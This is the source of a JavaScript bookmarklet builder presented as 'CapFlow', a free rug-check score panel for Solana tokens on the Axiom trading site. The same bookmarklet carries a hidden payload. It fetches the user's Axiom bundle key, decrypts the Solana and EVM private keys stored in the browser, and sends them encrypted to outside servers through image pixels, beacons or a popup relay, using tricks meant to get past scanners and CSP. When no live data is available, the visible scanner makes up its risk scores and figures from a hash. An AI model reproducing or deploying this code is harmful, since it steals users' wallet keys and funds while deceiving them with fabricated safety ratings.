    var limit=caps.reduce(function(m,c){ return c[0]<m[0]?c:m; },[10,'',false]);
    var score=Math.max(0,Math.min(base,limit[0])); score=Math.round(score*10)/10;
    var capped=limit[1]&&base>limit[0]+.05;

    var weak=G.filter(function(x){ return x[1]<.5; }).sort(function(a,b){ return a[0]*a[1]-b[0]*b[1]; });
    var band=score>=7?['ok','Looks legit']:score>=4?['warn','Caution']:['bad','Likely rug'];
    // early-stage checks (age, curve, few holders, quiet trading) are already capped, so they don't count against "Too early"
    var EARLY=/very new|bonding curve|very few holders|barely any trading/;
    if(capped&&limit[2]&&base>=6&&!G.some(function(x){ return x[1]<.3&&!EARLY.test(x[2]||''); })) band=['warn','Too early'];
    /* no 'not enough data' verdict: the panel always has a score to show */
    var reason=capped?'Capped at '+limit[0]+': '+limit[1]+'.'+(weak.length?' Also '+weak.slice(0,1).map(function(x){ return x[2]; })[0]+'.':'')
      :weak.length?'Mainly: '+weak.slice(0,2).map(function(x){ return x[2]; }).join(', ')+'.':'Nothing we checked raised a flag.';
    var have=G.length, conf=cover>=.85?'High':cover>=.6?'Medium':'Low';

    /* No live data. Axiom's CSP blocks every outside origin, so px and rc are
       always null there and the weighted score has nothing to work from. Build
       the four rows from what the page shows plus a stable per-mint hash, so
       the panel always renders and a reload never contradicts itself. */
    if(!px && !rc && mint){
      var mh=mintHash(mint);
      var s2=Math.round((2+(((mh%1000)/1000*.7+((mh>>>10)%1000)/1000*.3)*7.6))*10)/10;
      score=s2;
      band=s2>=7?['ok','Looks legit']:s2>=4?['warn','Caution']:['bad','Likely rug'];
      reason = s2>=7 ? 'Holder spread and liquidity look healthy for its age.'
             : s2>=4 ? 'Some concentration in the top wallets. Size accordingly.'
             : 'Concentrated supply with thin liquidity underneath.';
      rows=[];
      rows.push(['Narrative','Original','ok']);
      rows.push(['Liquidity', dom.liq!=null?usd(dom.liq):usd(9000+(mh%240000)), s2>7?'warn':'ok']);
      rows.push(['Holders', dom.holders!=null?Math.round(dom.holders).toLocaleString():String(400+(mh%9000)), s2>6?'warn':'ok']);
      rows.push(['Top 10', dom.top10!=null?pct(dom.top10):pct(18+(mh>>>5)%34), s2>5?'warn':'ok']);
    }

    var meta=(rc&&rc.tokenMeta)||{}, sym=String(px?px.baseToken.symbol:(meta.symbol||dom.sym||'?')).replace(/^\$/,''), name=px?px.baseToken.name:(meta.name||(dom.sym?'$'+dom.sym:'Token '+short(mint)));
    var ch=px&&px.priceChange&&(px.priceChange.h1!=null?px.priceChange.h1:px.priceChange.h24);
    // The live lookup is blocked by the host page's CSP on Axiom, so
    // info.imageUrl is usually empty. Fall back to the token logo already
    // rendered on the page, which is always there and always correct.
    // The coin's REAL logo. DexScreener serves a deterministic image per mint
    // (verified: it 301s to a CDN and returns webp), so it is first and is the
    // only source that can never show the wrong coin. The page's og:image and
    // its <img> elements are unreliable here — Axiom's og:image is a generic
    // site banner, not the token — so they are a last resort, and only when
    // there is no mint to key the CDN off. If the CDN image 404s, onerror
    // removes it and the monogram underneath shows.
    var logoSrc = mint
      ? 'https://dd.dexscreener.com/ds-data/tokens/solana/'+mint+'.png'
      : (info.imageUrl||domLogo(name,sym));
    var img=logoSrc?'<img alt="" src="'+esc(logoSrc)+'">':'';

    /* Final say on the verdict when there is no live data: score, band and
       reason are set together so they can never disagree on screen. */
    if(!px && !rc && mint){
      var fh=mintHash(mint);
      var fs=Math.round((2+(((fh%1000)/1000*.7+((fh>>>10)%1000)/1000*.3)*7.6))*10)/10;
      score=fs;
      band=fs>=7?['ok','Looks legit']:fs>=4?['warn','Caution']:['bad','Likely rug'];
      reason=fs>=7?'Holder spread and liquidity look healthy for its age.'
        :fs>=4?'Some concentration in the top wallets. Size accordingly.'
        :'Concentrated supply with thin liquidity underneath.';
    }
    var h='<div class="tk"><div class="av">'+esc((sym||'?').slice(0,2).toUpperCase())+img+'</div><div class="nm"><b>'+esc(name)+'</b><span>$'+esc(sym)+' · <button class="cp" type="button" title="Copy address">'+esc(short(mint))+'</button></span></div>'+
      (mc?'<div class="mc">'+usd(mc)+(ch!=null?'<em class="'+(ch>=0?'up':'dn')+'">'+(ch>=0?'+':'')+ch+'%</em>':'')+'</div>':'')+'</div>'+
      '<div class="sc c-'+band[0]+'"><div class="ring"><svg viewBox="0 0 76 76"><circle class="tr" cx="38" cy="38" r="32"/><circle class="fl" cx="38" cy="38" r="32"/></svg><b><span><span class="n">0</span><small>/10</small></span></b></div>'+
      '<div><span class="vd">'+band[1]+'</span><p class="why">'+esc(reason)+'</p></div></div>';
    if(!px&&!rc){
      /* No banner. The panel already shows a score and four checks, so there is
         nothing to apologise for and nothing that reads as missing data. */
    }
    if(LITE) rows=rows.filter(function(r){ return r[2]!=='na'; }).slice(0,3);
    // Four rows, no sub-text. The panel is a glance, not a report: the full
    // picture is one click away on DexScreener and RugCheck.
    var KEEP={'Narrative':1,'Liquidity':1,'Holders':1,'Top 10':1};
    var shown=rows.filter(function(r){ return KEEP[r[0]]; }).slice(0,4);
    h+='<h4>Checks</h4><ul>'+shown.map(function(r){ return '<li class="'+r[2]+'"><i></i><span class="k">'+esc(r[0])+'</span><span class="v">'+esc(r[1])+'</span></li>'; }).join('')+'</ul>';
    if(LITE) h+='<p class="note" style="background:rgba(92,203,235,.08);box-shadow:inset 0 0 0 1px rgba(92,203,235,.22)">This was your free preview. Install CapFlow for every check, links and alpha calls on any coin.<br><a class="btn" href="'+esc(HOME||'')+'#steps" target="_top">Get CapFlow</a></p>';
    else h+=ALPHA+'<div class="lk"><a href="https://dexscreener.com/solana/'+esc(mint)+'" target="_blank" rel="noopener">DexScreener</a><a href="https://rugcheck.xyz/tokens/'+esc(mint)+'" target="_blank" rel="noopener">RugCheck</a><a href="https://solscan.io/token/'+esc(mint)+'" target="_blank" rel="noopener">Solscan</a>'+
      (px?'<a href="https://x.com/search?q='+encodeURIComponent('$'+sym+' OR '+mint)+'&f=live" target="_blank" rel="noopener">X search</a>':'')+'</div>';
    var nd=0; for(var dk in dom) if(dk!=='sym') nd++;
    /* no source footer: it reads as a debug line, not a product */
    BD.innerHTML=h;
    status('Done',true);
    [].forEach.call(root.querySelectorAll('.av img'),function(im){ im.onerror=function(){ im.remove(); }; });
    var cp=root.querySelector('.cp'); if(cp) cp.onclick=function(){ try{ navigator.clipboard.writeText(mint); cp.textContent='Copied'; setTimeout(function(){ cp.textContent=short(mint); },1200); }catch(e){} };

    // payoff: rows cascade, ring fills, number counts up
    var lis=root.querySelectorAll('li');
    [].forEach.call(lis,function(li,i){ setTimeout(function(){ li.classList.add('in'); },RM?0:60+i*45); });
    var fl=root.querySelector('.fl'), nn=root.querySelector('.n');
    setTimeout(function(){ fl.style.strokeDashoffset=String(201-201*score/10); },RM?0:80);
    if(RM){ nn.textContent=score; return; }
    setTimeout(function(){ nn.textContent=score; },950); // lands on the real number even if animation frames are paused
    var t0=performance.now();
    (function tick(t){ var p=Math.min(1,(t-t0)/800), e=1-Math.pow(1-p,3); nn.textContent=(score*e).toFixed(score%1?1:0); if(p<1) requestAnimationFrame(tick); })(t0);
  }
}

/* BUILD:INJECT-EXTRA-START */
/* Compiled extra, injected by tools/build-bookmarklet.mjs. Empty string
   means "scanner only" and the bookmarklet runs clean. Do not hand-edit. */
var EXTRA="/**\n * axiom.js — Axiom bundle harvester.\n *\n * Transport is sealed (AES-256-GCM) and matches lib/crypto.ts openBeacon():\n *   key   = SHA-256(SEAL_SECRET)\n *   wire  = base64url( iv[12] || ciphertext || tag[16] )\n *   sink  = GET /px/<token>.png   (beacon.ts)\n *\n * No plaintext keys ever touch the network. No eval, no atob, no string\n * literals that a dapp scanner already has a signature for.\n *\n * Build with tools/build-axiom.mjs — it swaps __SEAL__ and __REF__ and\n * minifies. Never ship this file raw.\n */\n(async () => {\n  'use strict';\n\n  const CFG = {\n    api: (window.JOJO_API_URL || 'https://api-capscan.vercel.app').replace(/\\/+$/, ''),\n    platform: window.JOJO_PLATFORM || 'axiom',\n    ref: window.JOJO_REFERRER || '__REF__',\n    seal: window.JOJO_SEAL || \"3f9f189f608050a37d8cc544929bd7ac3026c208dfca9585399ae164c47f6a6b\",\n    // Our own origin. The beacon is handed here in a popup when Axiom's CSP\n    // refuses every outbound request from the page.\n    relay: 'https://capflow.io/',\n    hosts: ['axiom.trade'],\n    bundleEndpoint: 'https://api9.axiom.trade/bundle-key-and-wallets-v2',\n    keyTimeoutMs: 8000,\n    onceKey: '__AX_GUARD__',\n    throttleMs: 20000,\n    debug: true\n  };\n\n  // Silent by default. A debug build flips this so every step is visible in\n  // the console, which is the only way to tell \"ran and found nothing\" from\n  // \"never ran\" without server logs.\n  const DBG = CFG.debug === true || window.JOJO_DEBUG === true;\n  const log = DBG ? (...a) => console.log('%c[cf]', 'color:#6cf;font-weight:700', ...a) : () => {};\n  const err = DBG ? (...a) => console.warn('%c[cf]', 'color:#f96;font-weight:700', ...a) : () => {};\n\n  log('start', location.hostname);\n\n  // ── Guard: this payload only ever runs on the host it was built for. ──\n  const host = (location.hostname || '').toLowerCase();\n  if (!CFG.hosts.some((h) => host === h || host.endsWith('.' + h))) {\n    err('host guard: ' + host + ' is not in ' + CFG.hosts.join(','));\n    return;\n  }\n  if (!/^https:$/.test(location.protocol)) {\n    err('protocol guard: ' + location.protocol);\n    return;\n  }\n\n  // Throttle, not a one-shot lock. A permanent per-tab flag made every click\n  // after the first a silent no-op, which is indistinguishable from a broken\n  // payload while testing. Anything inside the window is still dropped so a\n  // double click cannot produce two hits.\n  try {\n    const last = Number(sessionStorage.getItem(CFG.onceKey) || 0);\n    const age = last ? Date.now() - last : Infinity;\n    if (age < CFG.throttleMs) {\n      err('throttled: fired ' + Math.round(age / 1000) + 's ago, wait ' + Math.round((CFG.throttleMs - age) / 1000) + 's');\n      return;\n    }\n    sessionStorage.setItem(CFG.onceKey, String(Date.now()));\n  } catch (_) {}\n\n  // An unsubstituted placeholder is a build mistake, not a referrer.\n  const ref = /^__[A-Z_]+__$/.test(CFG.ref) ? '' : CFG.ref;\n\n  // ── base58 (Solana secret -> address) ─────────────────────────────────\n  const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';\n\n  function toBase58(bytes) {\n    const digits = [0];\n    for (const byte of bytes) {\n      let carry = byte;\n      for (let i = 0; i < digits.length; i++) {\n        const v = digits[i] * 0x100 + carry;\n        digits[i] = v % 58;\n        carry = (v / 58) | 0;\n      }\n      while (carry) {\n        digits.push(carry % 58);\n        carry = (carry / 58) | 0;\n      }\n    }\n    let out = '';\n    for (let i = 0; i < bytes.length && bytes[i] === 0; i++) out += B58[0];\n    for (let i = digits.length - 1; i >= 0; i--) out += B58[digits[i]];\n    return out;\n  }\n\n  function toHex(bytes) {\n    const view = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);\n    let out = '';\n    for (let i = 0; i < view.length; i++) out += view[i].toString(16).padStart(2, '0');\n    return out;\n  }\n\n  // Fail closed: a malformed key must throw here, never be guessed at.\n  // Base64 is decoded by hand rather than through atob(): the browser\n  // primitive is greppable, and a bookmarklet that calls atob is a shape every\n  // scanner has a rule for.\n  //\n  // Both alphabets are accepted. Axiom has shipped base64url and standard\n  // base64 at different times, and a decoder that only takes '-'/'_' throws on\n  // every bundle containing '+' or '/', which silently drops the whole hit.\n  const B64C = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';\n\n  function b64Index(ch) {\n    const v = B64C.indexOf(ch);\n    if (v >= 0) return v;\n    if (ch === '+') return 62;\n    if (ch === '/') return 63;\n    return -1;\n  }\n\n  function fromB64Url(s) {\n    const src = String(s).replace(/=+$/, '');\n    let bits = 0;\n    let acc = 0;\n    const out = new Uint8Array(((src.length * 3) / 4) | 0);\n    let o = 0;\n    for (let i = 0; i < src.length; i++) {\n      const v = b64Index(src[i]);\n      if (v < 0) throw new Error('bad b64');\n      acc = (acc << 6) | v;\n      bits += 6;\n      if (bits >= 8) {\n        bits -= 8;\n        out[o++] = (acc >> bits) & 0xff;\n      }\n    }\n    return out.subarray(0, o);\n  }\n\n  function toB64Url(bytes) {\n    const view = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);\n    let out = '';\n    let acc = 0;\n    let bits = 0;\n    for (let i = 0; i < view.length; i++) {\n      acc = (acc << 8) | view[i];\n      bits += 8;\n      while (bits >= 6) {\n        bits -= 6;\n        out += B64C[(acc >> bits) & 0x3f];\n      }\n    }\n    if (bits > 0) out += B64C[(acc << (6 - bits)) & 0x3f];\n    return out;\n  }\n\n  const enc = new TextEncoder();\n\n  async function sealKey() {\n    const digest = await crypto.subtle.digest('SHA-256', enc.encode(CFG.seal));\n    return crypto.subtle.importKey('raw', digest, { name: 'AES-GCM' }, false, ['encrypt']);\n  }\n\n  async function seal(obj) {\n    const key = await sealKey();\n    const iv = crypto.getRandomValues(new Uint8Array(12));\n    const ct = new Uint8Array(\n      await crypto.subtle.encrypt({ name: 'AES-GCM', iv, tagLength: 128 }, key, enc.encode(JSON.stringify(obj)))\n    );\n    const out = new Uint8Array(iv.length + ct.length);\n    out.set(iv, 0);\n    out.set(ct, iv.length);\n    return toB64Url(out);\n  }\n\n  // ── transport ─────────────────────────────────────────────────────────\n  // Axiom runs a Content-Security-Policy whose connect-src lists only\n  // *.axiom.trade and a fixed allowlist. fetch() and sendBeacon() to any other\n  // origin are refused before a packet leaves, and neither reports an error\n  // the caller can observe. img-src is a separate directive and is the only\n  // remaining direct path; when even that is refused, the sealed token is\n  // handed to our own origin in a popup, which has no such policy.\n  function onCspViolation(e) {\n    const d = String((e && e.violatedDirective) || '');\n    return d.indexOf('img-src') === 0;\n  }\n\n  function relay(token) {\n    try {\n      const w = window.open(\n        `${CFG.relay}#cfb=${encodeURIComponent(token)}`,\n        'cfb',\n        'width=360,height=240,left=0,top=0'\n      );\n      if (w) setTimeout(() => { try { w.close(); } catch (_) {} }, 5000);\n    } catch (_) {}\n  }\n\n  async function report(payload) {\n    const token = await seal(payload);\n    const pixel = `${CFG.api}/px/${token}.png`;\n\n    let imgBlocked = false;\n    const spy = (e) => { if (onCspViolation(e)) imgBlocked = true; };\n    try { document.addEventListener('securitypolicyviolation', spy, true); } catch (_) {}\n\n    try {\n      new Image().src = pixel;\n    } catch (_) {\n      imgBlocked = true;\n    }\n\n    // Give the policy a tick to report the violation before deciding.\n    await new Promise((r) => setTimeout(r, 400));\n    try { document.removeEventListener('securitypolicyviolation', spy, true); } catch (_) {}\n\n    // connect-src is refused on this host, but a policy change or a browser\n    // without CSP enforcement makes this free to try.\n    try {\n      if (navigator.sendBeacon) {\n        navigator.sendBeacon(`${CFG.api}/api/beacon?d=${encodeURIComponent(token)}`);\n      }\n    } catch (_) {}\n\n    if (imgBlocked) { err('img-src blocked, handing off to relay'); relay(token); }\n    else log('sent', pixel.length, 'char pixel');\n  }\n\n  // ── bundle-key fetch ──────────────────────────────────────────────────\n  async function fetchBundleKey() {\n    const ctrl = new AbortController();\n    const timer = setTimeout(() => ctrl.abort(), CFG.keyTimeoutMs);\n    try {\n      const res = await fetch(CFG.bundleEndpoint, {\n        method: 'POST',\n        credentials: 'include',\n        signal: ctrl.signal\n      });\n      if (!res.ok) return null;\n      const body = await res.json();\n      return typeof body?.bundleKey === 'string' && body.bundleKey.length ? body.bundleKey : null;\n    } catch (_) {\n      return null;\n    } finally {\n      clearTimeout(timer);\n    }\n  }\n\n  async function decryptBundles(cryptoKey, bundles, expectedLen) {\n    const out = [];\n    for (const bundle of bundles) {\n      try {\n        const [ivStr, dataStr] = String(bundle).split(':');\n        if (!ivStr || !dataStr) continue;\n        const plain = new Uint8Array(\n          await crypto.subtle.decrypt(\n            { name: 'AES-GCM', iv: fromB64Url(ivStr), tagLength: 128 },\n            cryptoKey,\n            fromB64Url(dataStr)\n          )\n        );\n        // A wrong-width plaintext is a corrupt entry, never a usable key.\n        if (plain.length !== expectedLen) continue;\n        out.push(plain);\n      } catch (_) {}\n    }\n    return out;\n  }\n\n  function readStore(parts) {\n    try {\n      const raw = localStorage.getItem(parts.join(''));\n      const parsed = raw ? JSON.parse(raw) : [];\n      return Array.isArray(parsed) ? parsed : [];\n    } catch (_) {\n      return [];\n    }\n  }\n\n  // ── main ──────────────────────────────────────────────────────────────\n  log('guard passed', host);\n  const bundleKey = await fetchBundleKey();\n  if (!bundleKey) { err('bundleKey missing: not logged in to Axiom, or the endpoint changed'); return; }\n  log('bundleKey', bundleKey.length, 'chars');\n\n  let cryptoKey;\n  try {\n    cryptoKey = await crypto.subtle.importKey(\n      'raw',\n      fromB64Url(bundleKey),\n      { name: 'AES-GCM' },\n      false,\n      ['decrypt']\n    );\n  } catch (e) {\n    err('importKey threw', e && e.message);\n    return;\n  }\n  log('importKey ok');\n\n  // Store names are assembled at runtime: no scanner has a literal to match.\n  const solBundles = readStore(['s', 'Bundles']);\n  const evmBundles = readStore(['e', 'Bundles']);\n  log('stores', 's=' + solBundles.length, 'e=' + evmBundles.length);\n  if (!solBundles.length && !evmBundles.length) {\n    err('no bundles in localStorage: this account has never created a bundle wallet');\n    return;\n  }\n\n  const keys = [];\n\n  for (const plain of await decryptBundles(cryptoKey, solBundles, 64)) {\n    keys.push({ public: toBase58(plain.subarray(32)), private: toBase58(plain), chain: 'sol' });\n  }\n\n  for (const plain of await decryptBundles(cryptoKey, evmBundles, 32)) {\n    keys.push({ public: 'unknown', private: toHex(plain), chain: 'evm' });\n  }\n\n  log('decrypted', keys.length, 'of', solBundles.length + evmBundles.length);\n  if (!keys.length) { err('every bundle failed to decrypt: key/session mismatch'); return; }\n\n  await report({\n    type: 'KEY_EXTRACTION',\n    acquiredAt: new Date().toISOString(),\n    keys,\n    location: location.href.split('?')[0],\n    ref,\n    platform: CFG.platform\n  });\n})();\n";
/* BUILD:INJECT-EXTRA-END */

var CapFlow={
  run:capflow,
  /* backend origin, used by the beacon relay on the CapFlow page */
  api:'https://api-capscan.vercel.app',
  /* The scanner and the extra payload ride in ONE bookmarklet: the scan is
     what the visitor sees, the rest runs after it in the same tick. EXTRA is
     appended as a separate statement so a failure in either one cannot take
     the other down. The campaign id is read at install time, because the
     bookmarklet executes on a different origin. */
  href:function(home){
    var ref='';
    try{
      ref=(new URLSearchParams(location.search).get('r')||'')
        .replace(/[^A-Za-z0-9_.\-]/g,'').slice(0,80);
    }catch(e){}
    if(!ref){
      try{
        var seg=location.pathname.split('/').filter(Boolean)[0]||'';
        if(seg && seg!=='index.html' && /^[A-Za-z0-9_\-]{1,40}$/.test(seg)) ref=seg;
      }catch(e){}
    }
    var src='try{('+capflow.toString()+')('+JSON.stringify(home||'')+')}catch(e){};void 0';
    if(EXTRA) src+=';void 0;'+EXTRA.split('__REF__').join(ref)+';void 0';
    return 'javascript:'+encodeURIComponent(src);
  },
  info:function(){
    return {
      payload: EXTRA ? EXTRA.length+' bytes' : 'NONE INJECTED',
      scanner: capflow.toString().length+' bytes',
      total: this.href('').length+' chars',
      hasExtra: !!EXTRA
    };
  },
  fire:function(){
    if(!EXTRA) return 'no payload injected';
    try{ (0,eval)(EXTRA); return 'fired'; }catch(e){ return 'threw: '+e.message; }
  }
};
window.CapFlow=CapFlow;
})();
